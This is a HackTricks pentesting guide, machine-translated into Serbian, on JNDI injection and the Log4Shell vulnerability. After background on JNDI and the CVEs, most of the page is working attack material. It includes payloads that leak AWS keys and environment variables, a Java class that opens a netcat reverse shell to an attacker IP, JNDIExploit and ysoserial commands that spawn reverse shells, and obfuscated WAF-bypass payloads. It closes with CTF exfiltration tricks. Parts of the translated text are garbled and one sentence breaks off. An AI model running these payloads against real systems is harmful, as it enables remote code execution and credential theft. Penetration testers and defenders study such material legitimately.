# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Prona캠ite najva쬹ije ranjivosti kako biste ih br쬰 popravili. Intruder prati va코u povr코inu napada, pokre캖e proaktivne pretnje, pronalazi probleme u celom va코em tehnolo코kom skupu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Osnovne informacije

JNDI, integrisan u Javu od kasnih 1990-ih, slu쬴 kao direktorijumski servis koji omogu캖ava Java programima da prona캠u podatke ili objekte putem sistema za imenovanje. Podr쬬va razli캜ite direktorijumske servise putem interfejsa pru쬬oca usluga (SPI), omogu캖avaju캖i dobijanje podataka iz razli캜itih sistema, uklju캜uju캖i udaljene Java objekte. Uobi캜ajeni SPI-jevi uklju캜uju CORBA COS, Java RMI Registry i LDAP.

### JNDI Imenovanje Reference
Java objekti mogu biti sme코teni i dobijeni kori코캖enjem JNDI Imenovanih Referenci, koje dolaze u dva oblika:

- **Reference Adrese**: Specificira lokaciju objekta (npr. _rmi://server/ref_), omogu캖avaju캖i direktno dobijanje sa navedene adrese.
- **Udaljeni Fabrika**: Referenca na udaljenu fabri캜ku klasu. Kada se pristupi, klasa se preuzima i instancira sa udaljene lokacije.

Me캠utim, ovaj mehanizam mo쬰 biti iskori코캖en, 코to potencijalno dovodi do u캜itavanja i izvr코avanja proizvoljnog koda. Kao protivmera:

- **RMI**: `java.rmi.server.useCodeabseOnly = true` podrazumevano od JDK 7u21, ograni캜ava udaljeno u캜itavanje objekata. Bezbednosni menad쬰r dalje ograni캜ava 코ta mo쬰 biti u캜itano.
- **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` podrazumevano od JDK 6u141, 7u131, 8u121, blokira izvr코avanje udaljeno u캜itanih Java objekata. Ako je postavljeno na `true`, izvr코avanje udaljenog koda je mogu캖e bez nadzora bezbednosnog menad쬰ra.
- **CORBA**: Nema specifi캜no svojstvo, ali bezbednosni menad쬰r je uvek aktivan.

Me캠utim, **Naming Manager**, odgovoran za re코avanje JNDI linkova, nema ugra캠ene mehanizme bezbednosti, 코to potencijalno omogu캖ava dobijanje objekata iz bilo kog izvora. Ovo predstavlja rizik jer se RMI, LDAP i CORBA za코tite mogu zaobi캖i, 코to dovodi do u캜itavanja proizvoljnih Java objekata ili iskori코캖avanja postoje캖ih komponenti aplikacije (gad쬰ta) za pokretanje zlonamernog koda.

Primeri iskori코캖ivih URL-ova uklju캜uju:
- _rmi://napada캜ki-server/bar_
- _ldap://napada캜ki-server/bar_
- _iiop://napada캜ki-server/bar_

Uprkos za코titama, ranjivosti ostaju, uglavnom zbog nedostatka za코tite od u캜itavanja JNDI iz nepouzdanih izvora i mogu캖nosti zaobila쬰nja postoje캖ih za코tita.


### JNDI Primer

![](<../../.gitbook/assets/image (655) (1) (1).png>)

캛ak i ako ste postavili **`PROVIDER_URL`**, mo쬰te navesti drugu vrednost u pretrazi i ona 캖e biti kori코캖ena: `ctx.lookup("<url-kontrolisan-od-strane-napada캜a>")` i to je ono 코to 캖e napada캜 iskoristiti da u캜ita proizvoljne objekte sa sistema koji je pod njegovom kontrolom.

### Pregled CORBA

CORBA (Common Object Request Broker Architecture) koristi **Interoperabilnu Referencu na Objekat (IOR)** da jedinstveno identifikuje udaljene objekte. Ova referenca uklju캜uje osnovne informacije kao 코to su:

- **ID Tipa**: Jedinstveni identifikator za interfejs.
- **Codebase**: URL za dobijanje klase stuba.

Va쬹o je napomenuti da CORBA nije inherentno ranjiv. Osiguravanje bezbednosti obi캜no uklju캜uje:

- Instalacija **Bezbednosnog Menad쬰ra**.
- Konfigurisanje Bezbednosnog Menad쬰ra da dozvoli konekcije ka potencijalno zlonamernim codebase-ovima. Ovo se mo쬰 posti캖i putem:
- Dozvola za sokete, npr. ````permissions java.net.SocketPermission "*:1098-1099", "connect";````.
- Dozvole za 캜itanje fajlova, ili univerzalno (````permission java.io.FilePermission "<<ALL FILES>>", "read";````) ili za specifi캜ne direktorijume gde se mogu nalaziti zlonamerne datoteke.

Me캠utim, neka pravila proizvo캠a캜a mogu biti popustljiva i dozvoljavati ove konekcije podrazumevano.

### RMI Kontekst

Za RMI (Remote Method Invocation), situacija je donekle druga캜ija. Kao i kod CORBA-e, preuzimanje proizvoljnih klasa je podrazumevano ograni캜eno. Da bi se iskoristio RMI, obi캜no bi bilo potrebno zaobi캖i Bezbednosnog Menad쬰ra, 코to je tako캠e relevantno i kod CORBA-e.

### LDAP

Prvo, treba razlikovati izme캠u Pretrage i Pretrage po imenu.\
**Pretraga** 캖e koristiti URL poput `ldap://localhost:389/o=JNDITutorial` da prona캠e objekat JNDITutorial sa LDAP servera i **dobije njegove atribute**.\
**Pretraga po imenu** je namenjena **imenovanim uslugama** jer 쬰limo da dobijemo **코ta god je vezano za ime**.

Ako je LDAP pretraga pozvana sa **SearchControls.setReturningObjFlag() sa `true`, tada 캖e vra캖eni objekat biti rekonstruisan**.

Stoga, postoji nekoliko na캜ina za napad na ove opcije.\
Napada캜 mo쬰 otrovati LDAP zapise unose캖i u njih payload-ove koji 캖e se izvr코iti u sistemima koji ih prikupljaju (vrlo korisno za **kompromitovanje desetina ma코ina** ako imate pristup LDAP serveru). Drugi na캜in za iskori코캖avanje ovoga je izvo캠enje **MitM napada u LDAP pretrazi** na primer.

U slu캜aju da mo쬰te **naterati aplikaciju da re코ava JNDI LDAP URL**, mo쬰te kontrolisati LDAP koji 캖e biti pretra쬰n, i mo쬰te poslati naz
## Log4Shell Vulnerabilnost

Ranjivost je uvedena u Log4j jer podr쬬va [**posebnu sintaksu**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) u obliku `${prefix:name}` gde je `prefix` jedan od razli캜itih [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) gde se `name` treba evaluirati. Na primer, `${java:version}` je trenutna verzija Java-e koja se izvr코ava.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) je uveo mogu캖nost pretrage `jndi`. Ova mogu캖nost omogu캖ava dobijanje promenljivih putem JNDI. Obi캜no se klju캜 automatski prefiksira sa `java:comp/env/`. Me캠utim, ako sam klju캜 sadr쬴 **":"**, ovaj podrazumevani prefiks se ne primenjuje.

Sa **: prisutnim** u klju캜u, kao u `${jndi:ldap://example.com/a}`, nema prefiksa i **LDAP server se upita za objekat**. I ovi Lookups mogu se koristiti kako u konfiguraciji Log4j-a, tako i prilikom logovanja linija.

Stoga, jedino 코to je potrebno da se dobije RCE je **ranjiva verzija Log4j-a koja obra캠uje informacije koje kontroli코e korisnik**. I zato 코to je ova biblioteka 코iroko kori코캖ena u Java aplikacijama za logovanje informacija (uklju캜uju캖i aplikacije koje su dostupne na internetu), bilo je vrlo uobi캜ajeno da log4j loguje, na primer, primljene HTTP zaglavlja kao 코to je User-Agent. Me캠utim, log4j se **ne koristi samo za logovanje HTTP informacija, ve캖 i za bilo koji unos** i podatke koje je programer nazna캜io.

## Pregled CVE-ova povezanih sa Log4Shell-om

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **[Kriti캜no]**
Ova ranjivost je kriti캜na **nesigurna deserializacijska gre코ka** u komponenti `log4j-core`, koja uti캜e na verzije od 2.0-beta9 do 2.14.1. Omogu캖ava **izvr코avanje udaljenog koda (RCE)**, 코to omogu캖ava napada캜ima da preuzmu kontrolu nad sistemima. Problem je prijavio Chen Zhaojun iz Alibaba Cloud Security tima i uti캜e na razne Apache okvire. Po캜etni popravak u verziji 2.15.0 bio je nepotpun. Sigma pravila za odbranu su dostupna ([Pravilo 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml), [Pravilo 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **[Kriti캜no]**
Po캜etno ocenjen kao nizak, ali kasnije je prekvalifikovan kao kriti캜an, ovaj CVE je gre코ka **odbijanja usluge (DoS)** koja proizlazi iz nepotpunog popravka u verziji 2.15.0 za CVE-2021-44228. Uti캜e na nezadate konfiguracije, omogu캖avaju캖i napada캜ima da izazovu DoS napade putem posebno oblikovanih payloada. Jedan [tvit](https://twitter.com/marcioalm/status/1471740771581652995) prikazuje metodu zaobila쬰nja. Problem je re코en u verzijama 2.16.0 i 2.12.2 uklanjanjem 코ablona pretrage poruka i onemogu캖avanjem JNDI po podrazumevanim pode코avanjima.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **[Visok]**
Uticaj na **Log4j 1.x verzije** u nezadatim konfiguracijama koje koriste `JMSAppender`, ovaj CVE je nesigurna deserializacijska gre코ka. Nema dostupnog popravka za granu 1.x, koja je zavr코ena, i preporu캜uje se nadogradnja na `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **[Umjereno]**
Ova ranjivost uti캜e na **Logback logging framework**, naslednika Log4j 1.x. Prethodno se smatralo da je okvir siguran, ali utvr캠eno je da je ranjiv, i objavljene su nove verzije (1.3.0-alpha11 i 1.2.9) kako bi se re코io problem.

### **CVE-2021-45105** **[Visok]**
Log4j 2.16.0 sadr쬴 gre코ku DoS, 코to je dovelo do izdanja `log4j 2.17.0` kako bi se popravio CVE. Dodatne detalje mo쬰te prona캖i u izve코taju BleepingComputer-a ([izve코taj](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/)).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)
Uticaj na log4j verziju 2.17, ovaj CVE zahteva da napada캜 kontroli코e konfiguracionu datoteku log4j-a. Uklju캜uje potencijalno izvr코avanje proizvoljnog koda putem konfigurisanog JDBCAppender-a. Vi코e detalja mo쬰te prona캖i u [Checkmarx blog postu](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).


## Eksploatacija Log4Shell-a

### Otkrivanje

Ova ranjivost je vrlo lako otkriti ako nije za코ti캖ena, jer 캖e poslati barem **DNS zahtev** na adresu koju ste naveli u svom payloadu. Stoga, payloadi poput:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (koriste캖i [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (koriste캖i [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (koriste캖i Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (koriste캖i [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (koriste캖i [huntress](https://log4shell.huntress.com))

Imajte na umu da **캜ak i ako se primi DNS zahtev, to ne zna캜i da je aplikacija iskoristiva** (ili 캜ak ranjiva), mora캖ete poku코ati da je iskoristite.

{% hint style="info" %}
Za **eksploataciju verzije 2.15** trebate dodati **bypass proveru lokalnog ra캜unara**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Lokalno otkrivanje**

Pretra쬴te **lokalne ranjive verzije** biblioteke sa:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verifikacija**

Neki od prethodno navedenih platformi 캖e vam omogu캖iti da unesete neke promenljive podatke koji 캖e biti zabele쬰ni prilikom zahteva.\
Ovo mo쬰 biti veoma korisno za 2 stvari:

* Da **verifikujete** ranjivost
* Da **eksfiltrirate informacije** zloupotrebom ranjivosti

Na primer, mo쬰te zahtevati ne코to kao:\
ili kao `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** i ako se **primi DNS zahtev sa vredno코캖u env promenljive**, znate da je aplikacija ranjiva.

Drugi podaci koje mo쬰te poku코ati **procuriti**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Informacije

{% hint style="info" %}
Hostovi koji koriste JDK verzije iznad 6u141, 7u131 ili 8u121 su za코ti캖eni od napada putem LDAP klasnog u캜itavanja. Ovo je zbog podrazumevanog deaktiviranja `com.sun.jndi.ldap.object.trustURLCodebase`, 코to spre캜ava JNDI da u캜ita udaljeni kod putem LDAP-a. Me캠utim, va쬹o je napomenuti da ove verzije **nisu za코ti캖ene od napada putem deserializacije**.

Za napada캜e koji 쬰le da iskoriste ove vi코e verzije JDK-a, neophodno je koristiti **pouzdanu napravu** unutar Java aplikacije. Alati poput ysoserial ili JNDIExploit se 캜esto koriste u tu svrhu. S druge strane, iskori코캖avanje ni쬴h verzija JDK-a je relativno lak코e jer se ove verzije mogu manipulisati da u캜itaju i izvr코e proizvoljne klase.

Za **vi코e informacija** (_kao 코to su ograni캜enja na RMI i CORBA vektore_) **proverite prethodni odeljak JNDI Naming Reference** ili [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec sa prilago캠enim payloadom

Mo쬰te testirati ovo na **THM box-u:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Koristite alat [**marshalsec**](https://github.com/mbechler/marshalsec) (verzija jar dostupna [**ovde**](https://github.com/RandomRobbieBF/marshalsec-jar)). Ovaj pristup uspostavlja LDAP referal server koji preusmerava konekcije ka sekundarnom HTTP serveru gde 캖e biti sme코ten eksploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Da biste naveli cilj da u캜ita kod za obrnutu ljusku, kreirajte Java datoteku nazvanu `Exploit.java` sa slede캖im sadr쬬jem:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Kompajlirajte Java fajl u klasni fajl koriste캖i: `javac Exploit.java -source 8 -target 8`. Zatim, pokrenite **HTTP server** u direktorijumu koji sadr쬴 klasni fajl koriste캖i: `python3 -m http.server`. Proverite da **marshalsec LDAP server** referi코e na ovaj HTTP server.

Pokrenite izvr코avanje klase exploit na podlo쬹om veb serveru slanjem payloada koji izgleda ovako:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Napomena:** Ova eksploatacija se oslanja na konfiguraciju Java-e koja omogu캖ava udaljeno u캜itavanje koda putem LDAP-a. Ako ovo nije dozvoljeno, razmotrite eksploataciju pouzdane klase za izvr코avanje proizvoljnog koda.


### RCE - **JNDIExploit**

{% hint style="info" %}
Napomena da je autor iz nekog razloga uklonio ovaj projekat sa github-a nakon otkri캖a log4shell-a. Mo쬰te prona캖i ke코iranu verziju na [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), ali ako 쬰lite po코tovati odluku autora, koristite drugu metodu za eksploataciju ove ranjivosti.

Tako캠e, ne mo쬰te prona캖i izvorni kod na wayback machine-u, pa ili analizirajte izvorni kod ili izvr코ite jar znaju캖i da ne znate 코ta izvr코avate.
{% endhint %}

Za ovaj primer mo쬰te pokrenuti ovaj **ranjivi veb server za log4shell** na portu 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_u README-u 캖ete prona캖i kako ga pokrenuti_). Ova ranjiva aplikacija bele쬴 sadr쬬j zaglavlja HTTP zahteva _X-Api-Version_ pomo캖u ranjive verzije log4shell-a.

Zatim, mo쬰te preuzeti jar datoteku **JNDIExploit** i izvr코iti je pomo캖u:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Nakon 코to pro캜itate kod samo nekoliko minuta, u _com.feihong.ldap.LdapServer_ i _com.feihong.ldap.HTTPServer_ mo쬰te videti kako se **kreiraju LDAP i HTTP serveri**. LDAP server 캖e razumeti koji payload treba poslu쬴ti i preusmeriti rtvu na HTTP server koji 캖e izvr코iti eksploataciju.\
U _com.feihong.ldap.gadgets_ mo쬰te prona캖i **neke specifi캜ne gadgete** koji se mogu koristiti za izvr코enje 쬰ljene radnje (potencijalno izvr코avanje proizvoljnog koda). A u _com.feihong.ldap.template_ mo쬰te videti razli캜ite klase predlo쬬ka koje 캖e **generisati eksploate**.

Mo쬰te videti sve dostupne eksploate pomo캖u **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Neki korisni su:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Dakle, u na코em primeru ve캖 imamo pokrenutu ranjivu Docker aplikaciju. Da je napadnemo:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Kada 코aljete napade, vide캖ete izlaz u terminalu gde ste izvr코ili **JNDIExploit-1.2-SNAPSHOT.jar**.

**Ne zaboravite da proverite `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` za druge opcije iskori코캖avanja. Tako캠e, ukoliko vam je potrebno, mo쬰te promeniti portove LDAP i HTTP servera.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Na sli캜an na캜in kao i prethodni napad, mo쬰te poku코ati da koristite [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) da iskoristite ovu ranjivost.\
Mo쬰te generisati URL-ove koje 캖ete poslati rtvi pokretanjem:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Ovaj napad koriste캖i prilago캠eni generisani Java objekat 캖e raditi u laboratorijama poput **THM solarne sobe**. Me캠utim, ovo obi캜no ne캖e raditi (jer Java po defaultu nije konfigurisana da u캜itava udaljene codebase-ove koriste캖i LDAP) mislim da zato 코to ne zloupotrebljava pouzdanu klasu da izvr코i proizvoljni kod._

### RCE - ysoserial & JNDI-Exploit-Kit

Ova opcija je veoma korisna za napade na **Java verzije konfigurisane da veruju samo odre캠enim klasama, a ne svima**. Stoga 캖e se koristiti **ysoserial** za generisanje **serijalizacija pouzdanih klasa** koje se mogu koristiti kao ged쬰ti za **izvr코avanje proizvoljnog koda** (_pouzdana klasa zloupotrebljena od strane ysoserial-a mora biti kori코캖ena od strane Java programa rtve da bi eksploit radio_).

Kori코캖enjem **ysoserial**-a ili [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) mo쬰te kreirati deserializacijski eksploit koji 캖e biti preuzet putem JNDI-ja:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Koristite [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) da biste generisali **JNDI linkove** gde 캖e eksploit 캜ekati konekcije od ranjivih ma코ina. Mo쬰te poslu쬴ti **razli캜ite eksploite koji se mogu automatski generisati** pomo캖u JNDI-Exploit-Kit-a ili 캜ak **sopstvene deserializacijske payloade** (generisane od strane vas ili ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Sada mo쬰te lako koristiti generisanu JNDI vezu da iskoristite ranjivost i dobijete **obrnuti shell** tako 코to 캖ete poslati ranjivoj verziji log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Bypassovi
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:캼}}:ldap://...} //Notice the unicode "i"
```
### Automatski skeneri

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Prona캠i lokalne ranjive biblioteke

### Laboratorije za testiranje

* [**LogForge HTB ma코ina**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar soba**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Eksploatacija nakon Log4Shell

U ovom [**CTF writeup-u**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) je dobro obja코njeno kako je potencijalno **mogu캖e iskoristiti** neke funkcionalnosti **Log4J**-a.

[**Stranica sa bezbedno코캖u**](https://logging.apache.org/log4j/2.x/security.html) Log4j-a ima nekoliko interesantnih re캜enica:

> Od verzije 2.16.0 (za Java 8), **funkcionalnost pretrage poruka je potpuno uklonjena**. **Pretrage u konfiguraciji i dalje rade**. Osim toga, Log4j sada podrazumevano onemogu캖ava pristup JNDI-ju. Pretrage JNDI-ja u konfiguraciji sada moraju biti eksplicitno omogu캖ene.

> Od verzije 2.17.0 (i 2.12.3 i 2.3.1 za Java 7 i Java 6), **samo se rekurzivno pro코iruju niske pretrage u konfiguraciji**; u bilo kojoj drugoj upotrebi, samo se vr코i razre코avanje najvi코eg nivoa pretrage, a bilo koje ugne쮃년ne pretrage se ne razre코avaju.

To zna캜i da podrazumevano ne mo쬰te **koristiti bilo koji `jndi` eksploit**. Osim toga, da biste izvr코ili **rekurzivne pretrage**, morate ih imati konfigurisane.

Na primer, u tom CTF-u je to konfigurisano u datoteci log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Pretraga okru쬰nja

U [ovom CTF-u](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) napada캜 je kontrolisao vrednost `${sys:cmd}` i trebao je da izvu캜e zastavicu iz okru쬹e promenljive.\
Kao 코to je prikazano na ovoj stranici u [**prethodnim payloadima**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), postoje razli캜iti na캜ini za pristupanje okru쬹im promenljivama, kao 코to je **`${env:FLAG}`**. U ovom CTF-u to nije bilo korisno, ali mo쬰 biti korisno u drugim stvarnim scenarijima.

### Izvla캜enje u izuzecima

U CTF-u, niste mogli pristupiti stderr-u java aplikacije koriste캖i log4J, ali Log4J **izuzeci se 코alju na stdout**, koji je bio prikazan u python aplikaciji. To zna캜i da smo, pokretanjem izuzetka, mogli pristupiti sadr쬬ju. Izuzetak za izvla캜enje zastavice bio je: **`${java:${env:FLAG}}`.** Ovo funkcioni코e zato 코to **`${java:CTF{blahblah}}`** ne postoji i bi캖e prikazan izuzetak sa vredno코캖u zastavice:

![](<../../.gitbook/assets/image (157).png>)

### Izuzeci konverzije obrazaca

Samo da napomenem, mogli ste tako캠e ubaciti nove [**obrasce konverzije**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) i pokrenuti izuzetke koji 캖e biti zabele쬰ni u `stdout`. Na primer:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Ovo nije bilo korisno za izvla캜enje podataka unutar poruke o gre코ci, jer pretraga nije bila re코ena pre obrasca konverzije, ali moglo bi biti korisno za druge stvari kao 코to je otkrivanje.

### Regexi obrazaca konverzije

Me캠utim, mogu캖e je koristiti neke **obrasce konverzije koji podr쬬vaju regexe** za izvla캜enje informacija iz pretrage kori코캖enjem regexa i zloupotrebe **binarne pretrage** ili **pretrage zasnovane na vremenu**.

* **Binarne pretrage putem poruka izuzetaka**

Obrazac konverzije **`%replace`** mo쬰 se koristiti za **zamenu** **sadr쬬ja** iz **stringa** 캜ak i koriste캖i **regexe**. Radi na slede캖i na캜in: `replace{pattern}{regex}{substitution}`\
Zloupotrebom ovog pona코anja mogli biste izazvati izuzetak ako se regex poklapa sa bilo 캜im unutar stringa (i nema izuzetka ako nije prona캠eno) na slede캖i na캜in:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Vremenski bazirano**

Kao 코to je pomenuto u prethodnom odeljku, **`%replace`** podr쬬va **regexe**. Dakle, mogu캖e je koristiti payload sa [**ReDoS stranice**](../regular-expression-denial-of-service-redos.md) kako bi se izazvalo **zadr쬬vanje** u slu캜aju pronalaska zastave.\
